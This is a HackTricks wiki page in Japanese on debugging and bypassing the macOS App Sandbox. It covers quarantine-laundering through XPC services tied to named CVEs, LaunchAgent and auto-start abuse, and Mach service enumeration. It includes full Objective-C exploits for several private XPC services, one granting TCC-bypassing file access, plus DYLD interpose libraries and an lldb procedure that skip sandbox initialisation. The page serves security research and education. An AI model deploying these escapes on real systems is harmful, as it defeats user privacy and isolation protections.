# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Sandboxのロードプロセス

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Image from <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

前の画像では、entitlement **`com.apple.security.app-sandbox`** を持つアプリケーションが実行されたときに、**Sandboxがどのようにロードされるか**を確認できます。

コンパイラは、`/usr/lib/libSystem.B.dylib` をバイナリにリンクします。

その後、**`libSystem.B`** は複数の関数を呼び出し、最終的に **`xpc_pipe_routine`** がアプリのentitlementを **`securityd`** に送信します。SecuritydはプロセスをSandbox内に隔離すべきかを確認し、必要であれば隔離します。\
最後に、**`__sandbox_ms`** が呼び出され、さらに **`__mac_syscall`** を呼び出すことでSandboxが有効化されます。<sup>[[1]](#references)[[3]](#references)</sup>

## 可能なBypass

### quarantine属性のBypass

**Sandbox化されたプロセスが作成したファイル**には、Sandbox escapeを防止するために **quarantine属性**が付加されます。したがって、新しいアプリケーションを配置して起動しようとしても、quarantineフラグによって阻止されます。つまり、**quarantine属性なしでファイルまたはフォルダを配置できれば、App Sandboxからescapeできます** — `.app` bundleを配置し、`open`で起動するだけです。新しく起動されたプロセスはLaunchServicesの下で実行され、元のSandboxの下では実行されないためです。

**quarantineされていないファイルを確実に配置する方法**は、**別のプロセスにファイルを作成させること**です。Mickey Jinによる[**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)で説明されているように、**App Sandbox**は配置されたファイルにquarantineを付加しますが、Service Sandboxの下で実行されるXPCサービスは付加しません。そのため、認証不要の複数のXPCサービスを「quarantine laundering」のprimitiveとして使用できます:<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) および **CVE-2023-32414** (`ArchiveService`): Sandbox化されたアプリから渡されたarchiveを指定場所に展開しますが、展開されたコンテンツに **quarantine xattr** を伝播しません。
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): `submitSignpostDataWithConfig:` のpath traversalにより、**quarantineなしで任意のディレクトリを作成**できました。これだけで、container外に完全な `.app` bundle構造を構築できます。
- **CVE-2024-27864** (`diskimagescontroller.xpc`): quarantineされたDMGを **結果として作成されるdeviceをquarantineせずに** attachするため、mountされたvolume上のアプリを起動できます。

> [!TIP]
> 通常、展開によって **executable permission bitが削除されます**。CVE-2023-27944で使用されたworkaroundは、bundleのmain executableとして、既存の署名済みsystem binary（例: `/System/Library/CoreServices/Automator Application Stub`）への **symlink** を配置することでした。これにより、配置したファイルに `+x` がなくても起動可能な状態を維持できます。

> [!CAUTION]
> これが機能する理由は、checkが起動対象itemの **flag** によって行われるためです: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, その後にのみ *"it's handed over to Gatekeeper for full 'first run' security checks"* が実行されます（[Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)）。起動するbundleにflagがなければGatekeeper passもありません — これがまさに上記のCVEが提供するprimitiveです。<sup>[[5]](#references)</sup>
>
> `.app` bundleがすでに実行を許可されている場合（「authorized to run」フラグが設定されたquarantine xattrを持っている場合）は、それをabuseすることもできます... ただし、その場合は、特権TCC permsがない限り **`.app`** bundle内に書き込めません（Sandbox内ではそのような権限を持てません）。

### Open機能のAbuse

[**last examples of Word sandbox bypass**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv)では、**`open`** cli機能をabuseしてSandboxをbypassする方法を確認できます。


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

アプリケーションが **Sandbox化されることを意図されている**（`com.apple.security.app-sandbox`）場合でも、たとえば **LaunchAgent**（`~/Library/LaunchAgents`）から実行されるようにすれば、Sandboxをbypassできます。\
[**this post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)で説明されているように、Sandbox化されたアプリでpersistenceを確保したい場合、そのアプリをLaunchAgentとして自動実行されるようにし、DyLib environment variablesを介してmalicious codeをinjectできる可能性があります。<sup>[[6]](#references)</sup>

### Auto Start LocationsのAbuse

Sandbox化されたプロセスが、**後でSandbox化されていないアプリケーションがbinaryを実行する場所に書き込み**できる場合、その場所にbinaryを **配置するだけでescape** できます。この種のlocationの良い例は、`~/Library/LaunchAgents` や `/System/Library/LaunchDaemons` です。

このために、**2 steps** が必要になる場合もあります: **よりpermissiveなSandbox**（`file-read*`, `file-write*`）を持つプロセスに、実際にコードを実行させ、そのコードによって **Sandboxなしで実行される場所**に書き込ませます。

**Auto Start locations**については、このページを確認してください:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### 他のプロセスのAbuse

そのSandboxプロセスから、より制限の少ないSandbox（またはSandboxなし）で実行されている **他のプロセスをcompromise** できれば、そのプロセスのSandboxへescapeできます:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### 利用可能なSystemおよびUser Mach services

Sandboxでは、profile `application.sb` で定義されているXPC経由の特定の **Mach services** と通信することも許可されています。これらのserviceのいずれかを **abuse** できれば、**Sandboxからescape** できる可能性があります。

[このwriteup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)で示されているように、Mach servicesに関する情報は `/System/Library/xpc/launchd.plist` に保存されています。そのファイル内で `<string>System</string>` と `<string>User</string>` を検索することで、SystemおよびUser Mach servicesをすべて見つけることができます。<sup>[[4]](#references)</sup>

さらに、`bootstrap_look_up` を呼び出すことで、Mach serviceがSandbox化されたアプリケーションから利用可能かどうかを確認できます:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Available PID Mach services

これらの Mach services は、[この writeup で sandbox から escape するために abuse されました](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)。当時、アプリケーションとその framework が必要とする **すべての XPC services** は、アプリの PID domain から確認できました（これらは `ServiceType` が `Application` の Mach Services です）。<sup>[[4]](#references)</sup>

**PID Domain XPC service に contact する**には、次のような行を使ってアプリ内に register するだけです：
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
さらに、`System/Library/xpc/launchd.plist` 内で `<string>Application</string>` を検索すると、すべての **Application** Mach services を見つけることができます。

有効な xpc services を見つける別の方法は、以下にあるものを確認することです。
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
この technique を悪用したいくつかの例は[**original writeup**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)にありますが、以下に要約した例を示します。<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

この service は常に `YES` を返すことで、すべての XPC 接続を許可します。また、メソッド `runTask:arguments:withReply:` は任意のパラメータで任意の command を実行します。

exploit は「次のように単純なもの」でした。
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

この XPC service は常に `YES` を返すことで、すべての client を許可していました。また、`createZipAtPath:hourThreshold:withReply:` method は folder の path を受け取り、それを ZIP file に圧縮していました。

そのため、偽の app folder structure を生成して圧縮し、その後 decompress して execute することで sandbox から escape できました。新しい files には quarantine attribute が付与されないためです。

exploit は次のとおりです。
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

この XPC service は、任意の接続を受け入れるメソッド `extendAccessToURL:completion:` を介して、XPC client に任意の URL への read および write access を付与できます。XPC service は FDA を持つため、これらの permissions を悪用して TCC を完全に bypass できます。

exploit は次のとおりです：
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Static Compiling と Dynamically linking

[**この研究**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) では、Sandbox を bypass する 2 つの方法が発見されました。Sandbox は **libSystem** library が load されたときに userland から適用されるためです。バイナリがこれの load を回避できれば、Sandbox は適用されません:<sup>[[2]](#references)</sup>

- バイナリが**完全に静的コンパイル**されていれば、その library の load を回避できます。
- **バイナリが library を一切 load する必要がなければ**（linker も libSystem 内にあるため）、libSystem を load する必要はありません。

### Shellcodes

**shellcodes** でさえ ARM64 では `libSystem.dylib` に link する必要があることに注意してください:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### 継承されない制限

**[このwriteupのbonus](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)** で説明されているように、次のような sandbox restriction は:<sup>[[4]](#references)</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
例えば、新しいプロセスを実行することで回避できます：
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
ただし、もちろん、この新しいプロセスは親プロセスから entitlements や privilege を継承しません。

### Entitlements

アプリケーションが特定の **entitlement** を持っている場合、次の例のように、一部の **actions** は **sandbox** によって **allowed** になることがあります。
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

**Interposting** の詳細については、以下を確認してください。


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### sandboxを防ぐために `_libsecinit_initializer` を Interpostする
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall`でSandboxを防ぐ
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### lldbでSandboxをデバッグおよびbypassする

Let's compile an application that should be sandboxed:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

その後、アプリをコンパイルします：
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> アプリはファイル **`~/Desktop/del.txt`** を**読み取ろう**としますが、**Sandbox では許可されません**。\
> Sandbox が bypass された後に読み取れるよう、そこにファイルを作成します：
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Sandbox がいつロードされるか確認するため、アプリケーションを debug してみましょう：
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Even with the Sandbox bypassed TCC** will ask the user if he wants to allow the process to read files from desktop

## References

- [1] [Jonathan Levin - The Apple Sandbox: Deeper into the Quagmire (HITB GSEC 2016 slides)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Mac App Store Sandbox Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - The Apple Sandbox: Deeper into the Quagmire (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): macOS TCC Bypass w/ Telegram using DyLib Injection (Part 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)

{{#include ../../../../../banners/hacktricks-training.md}}
